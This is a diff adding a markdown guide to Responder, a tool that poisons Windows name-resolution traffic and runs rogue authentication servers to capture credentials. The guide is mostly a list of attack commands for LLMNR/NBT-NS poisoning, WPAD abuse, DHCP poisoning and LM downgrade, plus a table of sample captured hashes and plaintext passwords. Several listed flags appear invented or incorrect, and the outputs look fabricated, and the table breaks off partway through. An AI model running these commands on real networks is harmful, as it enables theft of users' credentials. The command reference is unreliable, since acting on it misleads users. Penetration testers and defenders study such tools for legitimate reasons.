@@ -1,0 +1,300 @@
+---
+title: "Responder"
+description: "Responder tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['network', 'credentials']
+---
+
+**Responder** is an **open-source** LLMNR, NBT-NS, and MDNS poisoner with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication servers. It is one of the most powerful tools for capturing credentials in Windows Active Directory environments. Responder exploits the weaknesses in Windows name resolution protocols to intercept authentication attempts and capture password hashes.
+
+**Here are the primary uses of Responder:**
+
+  * **LLMNR/NBT-NS Poisoning:** Responder poisons Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) queries, causing Windows systems to send authentication credentials to the attacker's machine. This is one of the most effective methods for obtaining credentials in Windows networks.
+
+  * **Credential Harvesting:** The tool captures NTLMv1, NTLMv2, and other authentication hashes when Windows systems attempt to authenticate to the rogue servers it creates. These hashes can be cracked offline or used in pass-the-hash attacks.
+
+  * **Man-in-the-Middle Attacks:** Responder can perform various man-in-the-middle attacks against Windows authentication mechanisms, intercepting and relaying authentication attempts to capture credentials or gain unauthorized access.
+
+  * **Rogue Server Deployment:** Responder deploys multiple rogue authentication servers (HTTP, SMB, MSSQL, FTP, LDAP) that mimic legitimate services, tricking clients into authenticating against them and revealing their credentials.
+
+  * **Active Directory Assessment:** Security professionals use Responder during Active Directory penetration tests to identify weak authentication practices, misconfigured systems, and vulnerable network segments where credentials can be easily captured.
+
+  * **Network Reconnaissance:** Beyond credential capture, Responder can gather valuable information about network structure, naming conventions, user accounts, and service locations within Windows environments.
+
+
+
+
+## Core Features​
+
+  * LLMNR Poisoning
+  * NBT-NS Poisoning
+  * MDNS Poisoning
+  * HTTP Authentication Server
+  * SMB Authentication Server
+  * MSSQL Authentication Server
+  * FTP Authentication Server
+  * LDAP Authentication Server
+  * NTLMv1/v2 Hash Capture
+  * Kerberos Hash Capture
+  * WPAD Proxy Server
+  * Analyze Mode
+  * Fingerprinting
+  * Session Management
+
+
+
+## Data sources​
+
+  * LLMNR Queries
+  * NBT-NS Queries
+  * MDNS Queries
+  * WPAD Requests
+  * Authentication Attempts
+  * Network Traffic
+  * Password Hashes
+  * User Credentials
+  * Service Requests
+
+
+
+## Common Responder Commands​
+
+### 1\. Basic Execution​
+
+  * This command starts Responder with default settings on the specified network interface. It begins poisoning LLMNR and NBT-NS queries to capture credentials.
+
+
+    
+    
+```bash
+responder -I <interface>  
+```
+### 2\. Analyze Mode​
+
+  * This command runs Responder in analyze mode, monitoring network traffic without performing any poisoning. It's useful for reconnaissance and understanding network behavior before launching attacks.
+
+
+    
+    
+```bash
+responder -I <interface> -A  
+```
+### 3\. Enable WPAD Proxy​
+
+  * This command enables the Web Proxy Auto-Discovery (WPAD) rogue proxy server. It can capture HTTP authentication credentials from browsers and applications using WPAD for proxy configuration.
+
+
+    
+    
+```bash
+responder -I <interface> -w  
+```
+### 4\. Force WPAD Authentication​
+
+  * This command forces WPAD authentication by serving a rogue PAC file that requires authentication. It's particularly effective for capturing credentials from web browsers.
+
+
+    
+    
+```bash
+responder -I <interface> -w -F  
+```
+### 5\. Disable SMB Server​
+
+  * This command disables the SMB authentication server while keeping other services active. It's useful when targeting specific protocols or avoiding detection.
+
+
+    
+    
+```bash
+responder -I <interface> --disable-smb  
+```
+### 6\. Disable HTTP Server​
+
+  * This command disables the HTTP authentication server, focusing poisoning efforts on other protocols like SMB or FTP.
+
+
+    
+    
+```bash
+responder -I <interface> --disable-http  
+```
+### 7\. Enable Fingerprinting​
+
+  * This command enables detailed fingerprinting of connecting hosts, gathering information about operating systems, browser versions, and other client details.
+
+
+    
+    
+```bash
+responder -I <interface> -f  
+```
+### 8\. Verbose Output​
+
+  * This command enables verbose output mode, displaying detailed information about all poisoning attempts, authentication captures, and network activity.
+
+
+    
+    
+```bash
+responder -I <interface> -v  
+```
+### 9\. Specify Log Directory​
+
+  * This command sets a custom directory for storing captured credentials and log files. It helps organize multiple assessment outputs.
+
+
+    
+    
+```bash
+responder -I <interface> -o /path/to/logs  
+```
+### 10\. Listen on All Interfaces​
+
+  * This command makes Responder listen on all available network interfaces simultaneously, useful for systems with multiple network connections.
+
+
+    
+    
+```bash
+responder -I all  
+```
+### 11\. Disable NetBIOS​
+
+  * This command disables NBT-NS poisoning while keeping LLMNR poisoning active. It's useful for targeting specific name resolution protocols.
+
+
+    
+    
+```bash
+responder -I <interface> --disable-nbt  
+```
+### 12\. Enable DHCP Poisoning​
+
+  * This command enables DHCP poisoning to inject malicious DNS server addresses, redirecting name resolution queries to the attacker's system.
+
+
+    
+    
+```bash
+responder -I <interface> -d  
+```
+### 13\. Custom Challenge​
+
+  * This command sets a custom NTLM challenge value instead of random challenges. It's useful for rainbow table attacks or specific testing scenarios.
+
+
+    
+    
+```bash
+responder -I <interface> --lm --challenge <challenge>  
+```
+### 14\. Force LM Downgrade​
+
+  * This command forces LM hash downgrade attacks, attempting to capture weaker LM hashes that are easier to crack than NTLMv2.
+
+
+    
+    
+```bash
+responder -I <interface> --lm  
+```
+### 15\. Run in Background​
+
+  * This command runs Responder as a background process, allowing it to continue capturing credentials while performing other tasks.
+
+
+    
+    
+```bash
+responder -I <interface> &  
+```
+### 16\. Target Specific Domain​
+
+  * This command configures Responder to target a specific Windows domain, focusing poisoning efforts on domain-joined systems.
+
+
+    
+    
+```bash
+responder -I <interface> -r <domain>  
+```
+### 17\. Disable Multicast​
+
+  * This command disables multicast name resolution poisoning, focusing only on broadcast-based NBT-NS queries.
+
+
+    
+    
+```bash
+responder -I <interface> --disable-mdns  
+```
+### 18\. Help and Usage Information​
+
+  * This command displays the help menu and usage information for Responder, listing all available options and attack modes.
+
+
+    
+    
+```bash
+responder -h  
+```
+Alternative usage:
+    
+    
+```bash
+responder --help  
+```
+## Output Examples of Responder Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Basic Execution| `responder -I eth0`| Starts poisoning on eth0 interface.| `[+] Listening for events... `   
+` [+] Poisoning LLMNR & NBT-NS`  
+Analyze Mode| `responder -I eth0 -A`| Monitors without poisoning.| `[+] Analyze mode enabled `   
+` [*] LLMNR request from 192.168.1.10`  
+WPAD Enabled| `responder -I eth0 -w`| Enables WPAD proxy server.| `[+] WPAD Proxy Server started `   
+` [+] Listening on port 3128`  
+Force WPAD Auth| `responder -I eth0 -w -F`| Forces WPAD authentication.| `[+] WPAD forced authentication enabled`  
+Disable SMB| `responder -I eth0 --disable-smb`| Disables SMB server.| `[+] SMB server disabled`  
+Disable HTTP| `responder -I eth0 --disable-http`| Disables HTTP server.| `[+] HTTP server disabled`  
+Fingerprinting| `responder -I eth0 -f`| Enables host fingerprinting.| `[+] Fingerprinting enabled `   
+` [*] OS: Windows 10 Pro`  
+Verbose Mode| `responder -I eth0 -v`| Shows detailed output.| `[*] Verbose mode enabled `   
+` [*] Sent poisoned answer to 192.168.1.10`  
+Custom Log Dir| `responder -I eth0 -o /tmp/logs`| Sets custom log directory.| `[+] Logs saved to /tmp/logs`  
+NBT-NS Poisoned| `responder -I eth0`| Captures NBT-NS query.| `[NBT-NS] Poisoned answer sent to 192.168.1.10 `   
+` Requested name: FILESERVER`  
+LLMNR Poisoned| `responder -I eth0`| Captures LLMNR query.| `[LLMNR] Poisoned answer sent to 192.168.1.10 `   
+` Requested name: SHAREPOINT`  
+SMB Hash Captured| `responder -I eth0`| Captures SMB NTLMv2 hash.| `[SMB] NTLMv2 Client: 192.168.1.10 `   
+` User: DOMAIN\john `   
+` Hash: john::DOMAIN:1122334455667788:...`  
+HTTP Hash Captured| `responder -I eth0`| Captures HTTP NTLM hash.| `[HTTP] NTLMv2 Client: 192.168.1.10 `   
+` User: admin `   
+` Hash: admin:::1122334455667788:...`  
+LDAP Credentials| `responder -I eth0`| Captures LDAP credentials.| `[LDAP] Clear text credentials: `   
+` User: administrator `   
+` Password: P@ssw0rd123`  
+FTP Hash Captured| `responder -I eth0`| Captures FTP authentication.| `[FTP] NTLMv2 Client: 192.168.1.10 `   
+` User: ftpuser `   
+` Hash: ftpuser::DOMAIN:...`  
+MSSQL Hash| `responder -I eth0`| Captures MSSQL authentication.| `[MSSQL] NTLMv2 Client: 192.168.1.10 `   
+` User: sa `   
+` Hash: sa::DOMAIN:...`  
+Kerberos TGT| `responder -I eth0`| Captures Kerberos ticket.| `[KRB5] TGT captured from 192.168.1.10 `   
+` User: john@DOMAIN.LOCAL`  
+WPAD Request| `responder -I eth0 -w`| Captures WPAD request.| `[WPAD] Request from 192.168.1.10 `   
+` User-Agent: Mozilla/5.0`  
+Clear Text Creds| `responder -I eth0`| Captures plaintext credentials.| `[+] Clear text credentials captured: `   
+` Username: admin `   
+` Password: password123`  
+Disable NBT-NS| `responder -I eth0 --disable-nbt`| Disables NBT-NS poisoning.| `[+] NBT-NS poisoning disabled`  
+LM Downgrade| `responder -I eth0 --lm`| Forces LM hash capture.| `[+] LM downgrade attack enabled `   
+` [LM] Hash captured from 192.168.1.10`  
+Custom Challenge| `responder -I eth0 --challenge 1122334455667788`| Uses custom NTLM challenge.| `[+] Using custom challenge: 1122334455667788`  
+DHCP Poisoning| `responder -I eth0 -d`| Enables DHCP poisoning.| `[+] DHCP poisoning enabled `   
+` [DHCP] Injected DNS: 192.168.1.100`  
+Session Info| `responder -I eth0`| Shows session statistics.| `[+] Captured 15 hashes `   
+` [+] 5 unique users compromised`  
+Startup Banner| `responder -I eth0`| Shows Responder startup.| ` _____ _ `   
+`
